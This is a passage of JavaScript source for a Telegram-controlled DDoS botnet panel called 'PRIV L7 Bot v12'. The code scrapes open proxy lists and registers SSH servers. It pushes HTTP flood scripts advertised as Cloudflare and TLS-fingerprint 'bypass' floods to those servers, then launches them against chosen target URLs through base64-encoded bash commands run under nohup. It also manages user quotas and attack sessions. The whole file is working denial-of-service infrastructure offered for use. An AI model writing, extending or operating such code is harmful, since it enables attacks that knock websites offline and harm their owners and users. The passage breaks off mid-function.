/**
 * PRIV L7 Bot v12 — Advanced Method Parser & Manager
 *
 * Improvements over v11:
 *  - Fixed parseSampleCommand: correctly strips "node file.js" prefix
 *  - Quote-aware tokenizer (handles "Mozilla/5.0 (Windows NT 10.0)")
 *  - Preview template before saving (admin confirms)
 *  - Method detail view: view template, re-sync, delete, test parse
 *  - "Sync All Methods" button — pushes every .js + proxy.txt to all servers
 *  - Custom method files auto-synced after save
 *  - /syncmethods slash command for admins
 *  - Better error messages on upload & parse
 *  - Backward compatible with old methods.json
 */

'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');

const TGModule = require('node-telegram-bot-api');
const TelegramBot = TGModule.default || TGModule;

const { Client } = require('ssh2');
const axios = require('axios');

/* ══════════════════════════ CONFIG ══════════════════════════ */

const CONFIG = {
  BOT_TOKEN: process.env.BOT_TOKEN || '',
  ADMIN_IDS: (process.env.ADMIN_ID || '').split(',').filter(Boolean).map(Number),
  SCRIPT_DIR: __dirname,
  DATA_DIR: path.join(__dirname, 'data'),
  DEFAULT_COOLDOWN: Number(process.env.COOLDOWN || 30),
  PROXY_FILE: 'proxy.txt',
  REMOTE_DIR: '/root/attack',
  SSH_TIMEOUT: 15000,
  HEALTH_CACHE_TTL: 30000,
  ATTACK_TIMEOUT: 25000,
  DEFAULT_THREADS: 16,
  DEFAULT_RATE: 90,
};

if (!CONFIG.BOT_TOKEN) { console.error('BOT_TOKEN required.'); process.exit(1); }
if (CONFIG.ADMIN_IDS.length === 0) { console.error('ADMIN_ID required.'); process.exit(1); }

fs.mkdirSync(CONFIG.DATA_DIR, { recursive: true });

const USERS_FILE = path.join(CONFIG.DATA_DIR, 'users.json');
const SERVERS_FILE = path.join(CONFIG.DATA_DIR, 'servers.json');
const METHODS_FILE = path.join(CONFIG.DATA_DIR, 'methods.json');
const BLACKLIST_FILE = path.join(CONFIG.DATA_DIR, 'blacklist.json');
const AUDIT_FILE = path.join(CONFIG.DATA_DIR, 'audit.log');

for (const [f, init] of [
  [USERS_FILE, '{}'], [SERVERS_FILE, '[]'], [METHODS_FILE, '[]'], [BLACKLIST_FILE, '[]'],
]) {
  if (!fs.existsSync(f)) fs.writeFileSync(f, init + '\n');
}

/* ══════════════════════════ STATE ══════════════════════════ */

const sessions = new Map();
const batches = new Map();
const cooldowns = new Map();
const pendingInput = new Map();
const serverConns = new Map();
const healthCache = new Map();
const warmupInProgress = new Set();

/* ══════════════════════════ STORAGE & HELPERS ══════════════════════════ */

function readJSON(f, fb) { try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch { return fb; } }
function writeJSON(f, d) {
  const tmp = f + '.tmp';
  fs.writeFileSync(tmp, JSON.stringify(d, null, 2) + '\n', { mode: 0o600 });
  fs.renameSync(tmp, f);
}
function audit(event, actor, details = {}) {
  try { fs.appendFileSync(AUDIT_FILE, JSON.stringify({ at: new Date().toISOString(), event, actor, details }) + '\n'); } catch {}
}

function loadUsers() { return readJSON(USERS_FILE, {}); }
function saveUsers(u) { writeJSON(USERS_FILE, u); }
function getUser(id) { return loadUsers()[String(id)] || null; }

function upsertUser(id, patch) {
  const users = loadUsers();
  const key = String(id);
  users[key] = { ...(users[key] || {}), ...patch, updatedAt: new Date().toISOString() };
  saveUsers(users);
  return users[key];
}

function isAdmin(id) { return CONFIG.ADMIN_IDS.includes(id); }

function ensureUserExists(msg) {
  const id = msg.from.id;
  const existing = getUser(id);
  if (existing) return existing;

  if (isAdmin(id)) {
    return upsertUser(id, {
      telegramId: id, username: msg.from.username || null,
      firstName: msg.from.first_name || null, role: 'admin',
      createdAt: new Date().toISOString(),
      limits: { maxDuration: 0, maxThreads: 0, maxRate: 0, maxConcurrent: 0, cooldown: 0 },
    });
  }

  return upsertUser(id, {
    telegramId: id, username: msg.from.username || null,
    firstName: msg.from.first_name || null, role: 'pending',
    createdAt: new Date().toISOString(),
    limits: { maxDuration: 300, maxThreads: 16, maxRate: 90, maxConcurrent: 1, cooldown: CONFIG.DEFAULT_COOLDOWN },
  });
}

/* ══════════════════════════ BLACKLIST ══════════════════════════ */

function loadBlacklist() { return readJSON(BLACKLIST_FILE, []); }
function saveBlacklist(l) { writeJSON(BLACKLIST_FILE, l); }

function normalizeHost(raw) {
  return String(raw || '').toLowerCase()
    .replace(/^[a-z]+:\/\//, '').replace(/[/?#].*$/, '').replace(/:\d+$/, '').replace(/\.+$/, '');
}

function hostMatches(h, p) {
  h = normalizeHost(h); p = normalizeHost(p);
  if (!h || !p) return false;
  if (p.startsWith('*.')) { const b = p.slice(2); return h === b || h.endsWith('.' + b); }
  return h === p;
}

function isBlacklisted(host) { return loadBlacklist().some(p => hostMatches(host, p)); }

/* ══════════════════════════ PROXIES ══════════════════════════ */

function readProxies() {
  const file = path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE);
  if (!fs.existsSync(file)) return [];
  return fs.readFileSync(file, 'utf8').split(/\r?\n/).map(l => l.trim()).filter(l => /^([0-9]{1,3}\.){3}[0-9]{1,3}:[0-9]{1,5}$/.test(l));
}

function saveProxies(list) {
  const unique = [...new Set(list)];
  fs.writeFileSync(path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE), unique.join('\n'));
  return unique.length;
}

const PROXY_SOURCES = [
  'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
  'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
  'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
  'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
  'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
  'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
  'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
  'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
];

async function scrapeProxies() {
  const seen = new Set(readProxies());
  const initialCount = seen.size;
  for (const src of PROXY_SOURCES) {
    try {
      const r = await axios.get(src, { timeout: 12000 });
      r.data.toString().split(/\r?\n/).forEach(l => {
        const t = l.trim();
        if (/^\d{1,3}(\.\d{1,3}){3}:\d{1,5}$/.test(t)) seen.add(t);
      });
    } catch {}
  }
  const list = [...seen];
  saveProxies(list);
  return list.length - initialCount;
}

/* ══════════════════════════ SAMPLE COMMAND PARSER (v12) ══════════════════════════ */

/**
 * Quote-aware tokenizer.
 * "Mozilla/5.0 (Windows NT 10.0)" → single token 'Mozilla/5.0 (Windows NT 10.0)'
 */
function tokenizeCommand(input) {
  const tokens = [];
  let cur = '';
  let inQuote = null;
  for (const c of String(input || '')) {
    if (inQuote) {
      if (c === inQuote) inQuote = null;
      else cur += c;
    } else if (c === '"' || c === "'") {
      inQuote = c;
    } else if (/\s/.test(c)) {
      if (cur) { tokens.push(cur); cur = ''; }
    } else {
      cur += c;
    }
  }
  if (cur) tokens.push(cur);
  return tokens;
}

/** Join template tokens for display: quote tokens containing spaces. */
function templateToString(items) {
  return items.map(t => (/\s/.test(t) ? `"${t}"` : t)).join(' ');
}

// Flags that take a value (space-separated or via =value)
const VALUE_FLAGS = new Set([
  'delay', 'query', 'timeout', 'rate', 'threads', 'thread', 'duration',
  'ua', 'useragent', 'user-agent', 'referer', 'referrer', 'cookie',
  'path', 'port', 'amount', 'repeat', 'retry', 'concurrent', 'conc',
  'host', 'payload', 'body', 'header', 'agent', 'auth', 'token', 'key',
  'mode', 'interval', 'count', 'max', 'min', 'size', 'cache', 'type',
  'format', 'content-type', 'accept', 'origin', 'x-forwarded-for',
]);

function isUrlToken(t) { return /^https?:\/\/\S+$/i.test(t); }
function isProxyToken(t) {
  if (/^\{proxy\}$/i.test(t)) return true;
  if (/prox\w*\.txt$/i.test(t)) return true;
  return false;
}
function isIntToken(t) { return /^\d+$/.test(t); }
function isFlagToken(t) { return /^-{1,2}\w/.test(t); }
function flagNameOf(t) { return t.replace(/^-{1,2}/, '').toLowerCase(); }

/**
 * Parse a sample command like:
 *   node K0ldvein.js https://example.com 1200 proxy.txt 8 8000 -bypass -origin
 *
 * Returns:
 *   { ok, template: string, tokens: string[], hasProxy, hasTarget, warnings }
 *
 * Template token meanings:
 *   $1 → target URL     $2 → duration     $3 → threads     $4 → rate
 *   {proxy} → proxy.txt (or CONFIG.PROXY_FILE)
 */
function parseSampleCommand(sampleStr) {
  const raw = String(sampleStr || '').trim();
  if (!raw) return { ok: false, error: 'Empty command' };

  let tokens = tokenizeCommand(raw);
  if (tokens.length === 0) return { ok: false, error: 'Empty command' };

  // Strip leading "node" / "node.exe" / "./node" / "/usr/bin/node"
  if (/^(\.{0,2}\/)?(.*\/)?node(\.exe)?$/i.test(tokens[0])) tokens.shift();
  // Strip ".js" / ".cjs" / ".mjs" filename
  if (tokens[0] && /\.(js|cjs|mjs)$/i.test(tokens[0])) tokens.shift();

  if (tokens.length === 0) return { ok: false, error: 'No arguments after script name' };

  const template = [];
  const warnings = [];
  let numSlot = 1;
  let seenTarget = false;
  let seenProxy = false;
  let i = 0;

  while (i < tokens.length) {
    const t = tokens[i];

    // URL → $1
    if (isUrlToken(t) && !seenTarget) {
      template.push('$1');
      seenTarget = true;
      numSlot = Math.max(numSlot, 2);
      i++;
      continue;
    }

    // Proxy file → {proxy}
    if (isProxyToken(t) && !seenProxy) {
      template.push('{proxy}');
      seenProxy = true;
      i++;
      continue;
    }

    // Flag
    if (isFlagToken(t)) {
      if (t.includes('=')) { template.push(t); i++; continue; } // --flag=value → literal
      const name = flagNameOf(t);
      const next = tokens[i + 1];
      const takesValue = VALUE_FLAGS.has(name);

      if (takesValue && next !== undefined && !isFlagToken(next)) {
        // --flag value → two tokens (so spawn passes them separately)
        if (isUrlToken(next) && !seenTarget) {
          template.push(t, '$1');
          seenTarget = true;
          numSlot = Math.max(numSlot, 2);
          i += 2;
        } else if (isProxyToken(next) && !seenProxy) {
          template.push(t, '{proxy}');
          seenProxy = true;
          i += 2;
        } else {
          template.push(t, next);
          i += 2;
        }
      } else {
        template.push(t);
        i++;
      }
      continue;
    }

    // Positional integer → $2 / $3 / $4
    if (isIntToken(t)) {
      if (numSlot <= 4) {
        template.push(`$${numSlot}`);
        numSlot++;
      } else {
        template.push(t);
      }
      i++;
      continue;
    }

    // Everything else → literal
    template.push(t);
    i++;
  }

  if (!seenTarget) return { ok: false, error: 'No target URL (http:// or https://) found' };
  if (!seenProxy) warnings.push('No proxy.txt found in sample — method will run without proxy');

  return {
    ok: true,
    template: templateToString(template),
    tokens: template,
    hasProxy: seenProxy,
    hasTarget: seenTarget,
    warnings,
  };
}

/** Reverse: turn a template string back into spawn-able args with substitutions. */
function buildArgsFromTemplate(templateStr, target, duration, threads, rate) {
  const tokens = tokenizeCommand(templateStr);
  return tokens.map(t => {
    if (t === '$1') return target;
    if (t === '$2') return duration;
    if (t === '$3') return threads;
    if (t === '$4') return rate;
    if (t === '{proxy}') return CONFIG.PROXY_FILE;
    return t;
  });
}

/* ══════════════════════════ METHODS ══════════════════════════ */

const BUILTIN_METHODS = [
  {
    id: 'priv', name: 'Privflood', file: 'priv.js', builtin: true,
    emoji: '🔴', desc: 'HTTP/1.1 + HTTP/2 Mixed Flood',
    example: '/attack priv <url> <dur>',
    parse: (a) => {
      const [target, duration, threads = String(CONFIG.DEFAULT_THREADS), rate = String(CONFIG.DEFAULT_RATE), ...f] = a;
      const b = [target, duration, CONFIG.PROXY_FILE, threads, rate];
      if (f.includes('cookies')) b.push('-c');
      if (f.includes('headers')) b.push('-h');
      if (f.includes('ddg')) b.push('-ddg');
      return { target, duration, threads, rate, args: b };
    },
  },
  {
    id: 'bypass', name: 'Bypass', file: 'bypass.js', builtin: true,
    emoji: '🟡', desc: 'Advanced HTTP/2 Bypass Flood',
    example: '/attack bypass <url> <dur>',
    parse: (a) => {
      let [target, duration, threads = String(CONFIG.DEFAULT_THREADS), rate = String(CONFIG.DEFAULT_RATE), ...o] = a;
      if (target && /^(GET|POST)$/i.test(target) && a.length >= 4) {
        const m = target.toUpperCase();
        [target, duration, threads, rate] = [duration, a[1], a[2] || String(CONFIG.DEFAULT_THREADS), a[3] || String(CONFIG.DEFAULT_RATE)];
        a = [m, ...a.slice(4)];
      }
      const b = ['GET', target, duration, threads, rate, CONFIG.PROXY_FILE];
      o.forEach(x => {
        if (x.startsWith('query=')) b.push('--query', x.split('=')[1]);
        else if (x === 'limit') b.push('--limit', 'true');
        else if (x.startsWith('delay=')) b.push('--delay', x.split('=')[1]);
        else if (x === 'ios') b.push('--ios');
      });
      return { target, duration, threads, rate, args: b };
    },
  },
  {
    id: 'crush', name: 'C-Rush', file: 'l.js', builtin: true,
    emoji: '🟢', desc: 'HTTP/1.1 & HTTP/2 Mixed RushAway',
    example: '/attack crush <url> <dur>',
    parse: (a) => {
      const [target, duration, threads = String(CONFIG.DEFAULT_THREADS), rate = String(CONFIG.DEFAULT_RATE), ...f] = a;
      const b = [target, duration, CONFIG.PROXY_FILE, threads, rate];
      if (f.includes('cookies')) b.push('-c');
      if (f.includes('headers')) b.push('-h');
      if (f.includes('cache')) b.push('-ch', 'true');
      return { target, duration, threads, rate, args: b };
    },
  },
  {
    id: 'tls', name: 'TLS-Bypass', file: 'tls.js', builtin: true,
    emoji: '🔵', desc: 'HTTP/2 TLS Fingerprint Bypass',
    example: '/attack tls <url> <dur>',
    parse: (a) => {
      const [target, duration, rate = String(CONFIG.DEFAULT_RATE), threads = String(CONFIG.DEFAULT_THREADS)] = a;
      return { target, duration, threads, rate, args: [target, duration, rate, threads, CONFIG.PROXY_FILE] };
    },
  },
];

function loadCustomMethods() { return readJSON(METHODS_FILE, []); }
function saveCustomMethods(l) { writeJSON(METHODS_FILE, l); }

function allMethods() {
  const custom = loadCustomMethods().map(m => {
    const templateStr = Array.isArray(m.template) ? templateToString(m.template) : (m.template || '');
    return {
      id: m.id, name: m.name || m.id, file: m.file, builtin: false, emoji: '🔧',
      desc: m.desc || 'Custom method',
      template: templateStr,
      sample: m.sample || '',
      example: m.example || `/attack ${m.id} <url> <dur>`,
      addedAt: m.addedAt,
      parse: (a) => {
        const [target, duration, threads = String(CONFIG.DEFAULT_THREADS), rate = String(CONFIG.DEFAULT_RATE)] = a;
        if (!target || !duration) throw new Error('Target and duration required');
        if (!templateStr) throw new Error('Method has no template');
        const args = buildArgsFromTemplate(templateStr, target, duration, threads, rate);
        return { target, duration, threads, rate, args };
      },
    };
  });
  return [...BUILTIN_METHODS, ...custom];
}

function getMethod(id) { return allMethods().find(m => m.id === id); }

function availableMethods() {
  return allMethods().filter(m => fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file)));
}

/* ══════════════════════════ SERVERS & SSH ══════════════════════════ */

function loadServers() { return readJSON(SERVERS_FILE, []); }
function saveServers(l) { writeJSON(SERVERS_FILE, l); }
function getServer(id) { return loadServers().find(s => s.id === id); }

function upsertServer(patch) {
  const list = loadServers();
  const idx = list.findIndex(s => s.id === patch.id);
  if (idx >= 0) list[idx] = { ...list[idx], ...patch };
  else list.push(patch);
  saveServers(list);
  return patch;
}

function removeServer(id) {
  const c = serverConns.get(id);
  if (c) { try { c.end(); } catch {} serverConns.delete(id); }
  healthCache.delete(id);
  saveServers(loadServers().filter(s => s.id !== id));
}

function newServerId() { return 'srv_' + crypto.randomBytes(3).toString('hex'); }

function serverStats() {
  const list = loadServers();
  const online = list.filter(s => s.status === 'online').length;
  const offline = list.length - online;
  const attacking = new Set(
    [...sessions.values()].filter(s => s.status === 'running' && s.where === 'remote').map(s => s.serverId)
  ).size;
  return { total: list.length, online, offline, attacking };
}

function sshConnect(server) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    let isSettled = false;
    const timer = setTimeout(() => {
      if (isSettled) return;
      isSettled = true;
      try { conn.end(); } catch {}
      reject(new Error('SSH timeout'));
    }, CONFIG.SSH_TIMEOUT);

    conn.on('ready', () => {
      if (isSettled) return;
      isSettled = true;
      clearTimeout(timer);
      resolve(conn);
    });
    conn.on('error', (e) => {
      if (isSettled) return;
      isSettled = true;
      clearTimeout(timer);
      try { conn.end(); } catch {}
      reject(e);
    });
    conn.on('error', () => {});

    try {
      conn.connect({
        host: server.host, port: server.port, username: server.username, password: server.password,
        readyTimeout: CONFIG.SSH_TIMEOUT,
        algorithms: { serverHostKey: ['ssh-rsa', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] },
      });
    } catch (e) {
      if (isSettled) return;
      isSettled = true;
      clearTimeout(timer);
      reject(e);
    }
  });
}

function sshExec(conn, cmd, timeoutMs = 120000) {
  return new Promise((resolve) => {
    let done = false;
    const timer = setTimeout(() => { if (!done) { done = true; resolve({ code: -1, out: '', err: 'exec timeout' }); } }, timeoutMs);
    try {
      conn.exec(cmd, (err, stream) => {
        if (err) { clearTimeout(timer); done = true; return resolve({ code: -1, out: '', err: err.message }); }
        let out = '', errOut = '';
        stream.on('data', d => { out += d.toString(); });
        stream.stderr.on('data', d => { errOut += d.toString(); });
        stream.on('close', (code) => { clearTimeout(timer); done = true; resolve({ code: code || 0, out, err: errOut }); });
      });
    } catch (e) { clearTimeout(timer); done = true; resolve({ code: -1, out: '', err: e.message }); }
  });
}

function sshUpload(conn, local, remote) {
  return new Promise((resolve, reject) => {
    conn.sftp((err, sftp) => {
      if (err) return reject(err);
      sftp.fastPut(local, remote, (e) => {
        try { sftp.end(); } catch {}
        if (e) reject(e); else resolve();
      });
    });
  });
}

async function getServerConn(id) {
  if (serverConns.has(id)) {
    const c = serverConns.get(id);
    if (c._ready) return c;
    serverConns.delete(id);
  }
  const server = getServer(id);
  if (!server) throw new Error('Server not found: ' + id);
  const conn = await sshConnect(server);
  conn._ready = true;
  conn.on('close', () => serverConns.delete(id));
  conn.on('error', () => serverConns.delete(id));
  serverConns.set(id, conn);
  return conn;
}

async function prewarmServers(serverIds) {
  const toWarm = serverIds.filter(id => !serverConns.has(id) && !warmupInProgress.has(id));
  if (toWarm.length === 0) return;
  toWarm.forEach(id => warmupInProgress.add(id));
  await Promise.allSettled(toWarm.map(async (id) => {
    try { await getServerConn(id); } catch {}
    warmupInProgress.delete(id);
  }));
}

async function checkServerHealth(id, force = false) {
  const cached = healthCache.get(id);
  if (!force && cached && Date.now() - cached.at < CONFIG.HEALTH_CACHE_TTL) return cached;
  try {
    const conn = await getServerConn(id);
    const r = await sshExec(conn, 'echo ok; uptime', 10000);
    const online = r.out.includes('ok');
    const load = (r.out.match(/load average: ([^\n]+)/) || [])[1] || '?';
    const result = { online, load, at: Date.now() };
    healthCache.set(id, result);
    upsertServer({ id, status: online ? 'online' : 'offline', lastCheck: Date.now() });
    return result;
  } catch (e) {
    const result = { online: false, load: '?', error: e.message, at: Date.now() };
    healthCache.set(id, result);
    upsertServer({ id, status: 'offline', lastCheck: Date.now() });
    return result;
  }
}

/** Upload one local method file + proxy.txt to a server. Returns {method, proxy}. */
async function syncMethodToServer(serverId, methodFile = null) {
  const conn = await getServerConn(serverId);
  await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 10000);
  const out = { method: false, proxy: false };

  if (methodFile) {
    const local = path.join(CONFIG.SCRIPT_DIR, methodFile);
    if (fs.existsSync(local)) {
      try { await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${methodFile}`); out.method = true; } catch {}
    }
  } else {
    for (const m of allMethods()) {
      const local = path.join(CONFIG.SCRIPT_DIR, m.file);
      if (fs.existsSync(local)) {
        try { await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${m.file}`); } catch {}
      }
    }
    out.method = true;
  }

  const p = path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE);
  if (fs.existsSync(p)) {
    try { await sshUpload(conn, p, `${CONFIG.REMOTE_DIR}/${CONFIG.PROXY_FILE}`); out.proxy = true; } catch {}
  }
  return out;
}

/* ══════════════════════════ ATTACK ENGINE ══════════════════════════ */

function newSessionId() { return 'sess_' + crypto.randomBytes(3).toString('hex'); }
function newBatchId() { return 'batch_' + crypto.randomBytes(4).toString('hex'); }

function userActiveSessions(id) {
  return [...sessions.values()].filter(s => s.owner === id && s.status === 'running').length;
}

function launchLocal(user, method, args, batchId) {
  const id = newSessionId();
  const methodPath = path.join(CONFIG.SCRIPT_DIR, method.file);
  if (!fs.existsSync(methodPath)) throw new Error(`File missing: ${method.file}`);

  const child = spawn(process.execPath, [methodPath, ...args], {
    cwd: CONFIG.SCRIPT_DIR, detached: true, stdio: ['ignore', 'pipe', 'pipe'],
    env: { PATH: process.env.PATH || '', NODE_ENV: 'production' },
  });

  const session = {
    id, batchId, owner: user.telegramId, method: method.id, methodName: method.name,
    target: args[0] || '?', duration: Number(args[1]) || 0,
    startedAt: Date.now(), status: 'running', where: 'local', child, logs: '',
  };
  child.stdout.on('data', d => { session.logs = (session.logs + d.toString()).slice(-3000); });
  child.stderr.on('data', d => { session.logs = (session.logs + d.toString()).slice(-3000); });
  child.on('exit', () => { session.status = 'done'; setTimeout(() => sessions.delete(id), 30000); });

  session.timer = setTimeout(() => stopSession(id, 'duration_expired'), session.duration * 1000);
  session.timer.unref();
  sessions.set(id, session);
  return session;
}

async function launchRemote(user, method, args, serverId, batchId) {
  const server = getServer(serverId);
  if (!server) throw new Error('Server not found: ' + serverId);
  const conn = await getServerConn(serverId);
  const check = await sshExec(conn, `test -f ${CONFIG.REMOTE_DIR}/${method.file} && echo OK || echo MISSING`, 8000);
  if (!check.out.includes('OK')) {
    try {
      await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 10000);
      const local = path.join(CONFIG.SCRIPT_DIR, method.file);
      if (!fs.existsSync(local)) throw new Error(`local missing: ${method.file}`);
      await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${method.file}`);
      const p = path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE);
      if (fs.existsSync(p)) await sshUpload(conn, p, `${CONFIG.REMOTE_DIR}/${CONFIG.PROXY_FILE}`);
    } catch (e) { throw new Error(`${server.name}: sync failed`); }
  }

  const id = newSessionId();
  const logFile = `/tmp/.atk_${id}.log`;
  const script = [
    `cd ${CONFIG.REMOTE_DIR} || exit 1`,
    `rm -f ${logFile}`,
    `nohup node ${method.file} ${args.join(' ')} < /dev/null > ${logFile} 2>&1 &`,
    `PID=$!`,
    `echo $PID`,
  ].join('\n');
  const b64 = Buffer.from(script).toString('base64');
  const cmd = `echo ${b64} | base64 -d | bash`;
  const r = await sshExec(conn, cmd, CONFIG.ATTACK_TIMEOUT);

  let remotePid = parseInt((r.out || '').trim().replace(/[^0-9]/g, ''), 10);
  if (!remotePid || isNaN(remotePid)) {
    const pg = await sshExec(conn, `pgrep -f "node ${method.file}" | head -1`, 8000);
    remotePid = parseInt((pg.out || '').trim().replace(/[^0-9]/g, ''), 10);
  }
  if (!remotePid || isNaN(remotePid)) {
    const tail = await sshExec(conn, `tail -3 ${logFile} 2>/dev/null || echo "no log"`, 6000);
    throw new Error(`${server.name}: ${(tail.out || '').trim().slice(0, 100) || 'launch failed'}`);
  }
  const alive = await sshExec(conn, `kill -0 ${remotePid} 2>/dev/null && echo ALIVE || echo DEAD`, 5000);
  if (!alive.out.includes('ALIVE')) throw new Error(`${server.name}: died immediately`);

  const session = {
    id, batchId, owner: user.telegramId, method: method.id, methodName: method.name,
    target: args[0] || '?', duration: Number(args[1]) || 0,
    startedAt: Date.now(), status: 'running', where: 'remote',
    serverId, serverName: server.name, remotePid, logFile, logs: '',
  };
  session.timer = setTimeout(() => stopSession(id, 'duration_expired'), session.duration * 1000);
  session.timer.unref();
  sessions.set(id, session);
  return session;
}

function stopSession(id, reason = 'manual') {
  const s = sessions.get(id);
  if (!s || s.status !== 'running') return false;

  if (s.where === 'local' && s.child) {
    try { process.kill(-s.child.pid, 'SIGKILL'); } catch { try { s.child.kill('SIGKILL'); } catch {} }
  } else if (s.where === 'remote' && s.remotePid) {
    (async () => {
      try {
        const conn = await getServerConn(s.serverId);
        await sshExec(conn, `kill -9 ${s.remotePid} 2>/dev/null || true; pkill -9 -P ${s.remotePid} 2>/dev/null || true`, 8000);
      } catch {}
    })();
  }
  clearTimeout(s.timer);
  s.status = 'stopped';
  audit('attack_stopped', s.owner, { id, reason });

  if (s.batchId) {
    const batch = batches.get(s.batchId);
    if (batch) {
      batch.pending--;
      if (batch.pending <= 0) {
        batches.delete(s.batchId);
        bot.sendMessage(batch.chatId,
          `🏁 <b>Attack finished</b>\n\n` +
          `📦 Method: <b>${batch.methodName}</b>\n` +
          `🎯 Target: <code>${batch.target}</code>\n` +
          `⏱ Duration: ${batch.duration}s\n\n` +
          `<i>All nodes finished. Ready for next.</i>`,
          { parse_mode: 'HTML' }
        ).catch(() => {});
      }
    }
  }
  return true;
}

function stopAllSessions(ownerFilter = null) {
  let killed = 0;
  for (const [id, s] of sessions.entries()) {
    if (s.status !== 'running') continue;
    if (ownerFilter && s.owner !== ownerFilter) continue;
    if (stopSession(id, 'killall')) killed++;
  }
  return killed;
}

/* ══════════════════════════ VALIDATION ══════════════════════════ */

function validateTarget(raw) {
  let url;
  try { url = new URL(raw); } catch { throw new Error('URL invalid'); }
  if (url.protocol !== 'https:' && url.protocol !== 'http:') throw new Error('must be http:// or https://');
  return { url: raw, host: normalizeHost(url.hostname) };
}

function checkLimits(user, d, th, r) {
  const l = user.limits || {};
  if (l.maxDuration > 0 && Number(d) > l.maxDuration) throw new Error(`Max duration ${l.maxDuration}s`);
  if (l.maxThreads > 0 && Number(th) > l.maxThreads) throw new Error(`Max threads ${l.maxThreads}`);
  if (l.maxRate > 0 && Number(r) > l.maxRate) throw new Error(`Max rate ${l.maxRate}`);
}

/* ══════════════════════════ BOT CORE ══════════════════════════ */

const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: true });

function esc(s) {
  return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

async function reply(msg, text, opts = {}) {
  try { return await bot.sendMessage(msg.chat.id, text, { parse_mode: 'HTML', ...opts }); }
  catch { try { return await bot.sendMessage(msg.chat.id, text); } catch {} }
}

async function edit(chatId, messageId, text, opts = {}) {
  try { await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', ...opts }); }
  catch {}
}

async function answerCB(id, text, alert = false) {
  try { await bot.answerCallbackQuery(id, { text, show_alert: alert }); } catch {}
}

function coloredBtn(text, callback_data, style) {
  return { text, callback_data, style };
}

/* ══════════════════════════ MENUS ══════════════════════════ */

function mainMenu(userId) {
  const kb = [
    [
      coloredBtn('🚀 New Attack', 'menu_attack', 'primary'),
      coloredBtn('📊 Live Status', 'menu_status', 'success')
    ],
    [
      coloredBtn('📦 Methods', 'menu_methods', 'primary'),
      coloredBtn('📡 Servers', 'menu_servers', 'primary')
    ],
  ];
  if (isAdmin(userId)) kb.push([coloredBtn('👑 Admin Panel', 'menu_admin', 'danger')]);
  return { inline_keyboard: kb };
}

function attackMenu() {
  const methods = availableMethods();
  const kb = [];
  for (let i = 0; i < methods.length; i += 2) {
    const row = methods.slice(i, i + 2).map(m => ({
      text: `${m.emoji || '📦'} ${m.name}`,
      callback_data: `method_${m.id}`,
      style: m.id === 'tls' ? 'danger' : (m.id === 'crush' ? 'success' : 'primary'),
    }));
    kb.push(row);
  }
  kb.push([coloredBtn('⬅️ Back to Menu', 'menu_main', 'danger')]);
  return { inline_keyboard: kb };
}

function methodMenu(methodId) {
  return {
    inline_keyboard: [
      [coloredBtn('⚡ Quick Launch', `quick_${methodId}`, 'success')],
      [coloredBtn('⬅️ Back to Methods', 'menu_attack', 'primary')],
    ],
  };
}

function backMenu(label = '⬅️ Back', cb = 'menu_main') {
  return { inline_keyboard: [[coloredBtn(label, cb, 'primary')]] };
}

function adminMenu() {
  return {
    inline_keyboard: [
      [
        coloredBtn('👥 Manage Users', 'adm_users', 'primary'),
        coloredBtn('🖥 Manage Servers', 'adm_servers', 'primary')
      ],
      [
        coloredBtn('📦 Manage Methods', 'adm_methods', 'primary'),
        coloredBtn('🚫 Blacklist', 'adm_blacklist', 'danger')
      ],
      [
        coloredBtn('🌐 Proxies', 'adm_proxies', 'primary'),
        coloredBtn('📊 Stats', 'adm_stats', 'success')
      ],
      [
        coloredBtn('🔄 Refresh All', 'adm_refresh', 'primary'),
        coloredBtn('💀 Kill All', 'adm_killall', 'danger')
      ],
      [coloredBtn('⬅️ Back to Menu', 'menu_main', 'primary')],
    ],
  };
}

/* ══════════════════════════ MENU HANDLERS ══════════════════════════ */

async function showMainMenu(chatId, editMsgId) {
  const stats = serverStats();
  const user = getUser(chatId) || {};
  const txt = [
    `🔥 <b>PRIV L7 HUB</b> 🔥`,
    ``,
    `👤 Role: <b>${user.role || 'guest'}</b>`,
    `📡 Servers: <b>${stats.online}/${stats.total}</b> online · <b>${stats.attacking}</b> attacking`,
    ``,
    `<i>Use buttons below or type /attack for direct launch.</i>`,
  ].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: mainMenu(chatId) });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: mainMenu(chatId) });
}

async function showAttackMenu(chatId, editMsgId) {
  const txt = `🚀 <b>Choose Method</b>\n\n<i>Click a method to see its command format and launch options.</i>`;
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: attackMenu() });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: attackMenu() });
}

async function showMethodDetail(chatId, editMsgId, methodId) {
  const m = getMethod(methodId);
  if (!m) return;
